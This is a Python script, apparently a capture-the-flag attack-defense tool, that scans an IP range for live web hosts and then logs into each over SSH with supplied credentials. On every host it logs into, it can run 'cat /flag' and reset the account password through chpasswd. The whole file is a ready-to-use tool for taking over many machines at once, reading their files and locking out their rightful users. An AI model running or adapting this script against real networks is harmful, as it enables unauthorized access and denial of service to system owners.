import requests
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys
import paramiko

alive_urls = []  # 全局列表，存储存活的URLs

def print_info_and_exit():
    print("""
  ____  ___  ______   ___   _ ____  _____ ____ 
 / ___|/ _ \|  _ \ \ / / | | / ___|| ____/ ___|
| |  _| | | | | | \ V /| | | \___ \|  _|| |    
| |_| | |_| | |_| || | | |_| |___) | |__| |___ 
 \____|\___/|____/ |_|  \___/|____/|_____\____|

SSH批量修改工具 Author By-GODYUSEC
""")
    print("使用方法:python ssh.py -u 192.168.199.*")
    sys.exit()

if len(sys.argv) == 1:
    print_info_and_exit()

parser = argparse.ArgumentParser(description='搜索活跃的Web服务器')
parser.add_argument('-u', '--url', type=str, help='IP地址范围，示例：192.168.111.* 或 192.168.*.1:8080', required=True)
args = parser.parse_args()

if ':' in args.url:
    ip_pattern, port = args.url.split(':')
else:
    ip_pattern = args.url
    port = "80"

parts = ip_pattern.split('.')

ssh_port = input("请输入SSH端口号（默认为22）：") or "22"
ssh_user = input("请输入SSH用户名：")
ssh_password = input("请输入SSH密码：")
execute_command = input("是否执行特定命令（cat /flag）？(y/n): ")
change_password = input("是否更改ssh密码？(y/n): ")
new_password = ""
if change_password.lower() == "y":
    new_password = input("请输入新密码：")

def get_ip(ip, alive_list):
    url = f"http://{ip}:{port}"
    try:
        resp = requests.get(url, timeout=1)
        if resp.status_code == 200:
            alive_list.append(url)  # 把存活的url添加到列表中
            print(f"存活: {url}")
    except requests.exceptions.RequestException:
        pass

def try_ssh_logins(alive_list, ssh_port, ssh_user, ssh_password, execute_command, change_password, new_password):
    for url in alive_list:
        ip = url.split("//")[-1].split(":")[0]  # 从URL中提取IP
        try_ssh_login(ip, ssh_port, ssh_user, ssh_password, execute_command, change_password, new_password)

def try_ssh_login(ip, ssh_port, username, password, execute_command, change_password, new_password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(ip, int(ssh_port), username, password, timeout=1)
        print(f"SSH登录成功: {ip}:{ssh_port} 使用账户 {username}")
        if execute_command.lower() == "y":
            stdin, stdout, stderr = ssh_client.exec_command("cat /flag")
            print(stdout.read().decode())
        if change_password.lower() == "y":
            command = f'echo {username}:{new_password} | chpasswd'
            stdin, stdout, stderr = ssh_client.exec_command(command)
            print(f"密码已更改为：{new_password}")
        ssh_client.close()
    except Exception as e:
        print(f"SSH登录失败: {ip}:{ssh_port} 使用账户 {username}，原因：{e}")

with ThreadPoolExecutor(max_workers=100) as executor:
    for part in parts:
        if '*' in part:
            for i in range(1, 255):
                new_parts = parts.copy()
                new_parts[new_parts.index('*')] = str(i)
                ip = '.'.join(new_parts)
                executor.submit(get_ip, ip, alive_urls)
            break

# 当所有任务完成后，打印存活的URLs
print("\n存活的URL列表:")
for url in alive_urls:
    print(url)

# 现在尝试SSH登录
try_ssh_logins(alive_urls, ssh_port, ssh_user, ssh_password, execute_command, change_password, new_password)
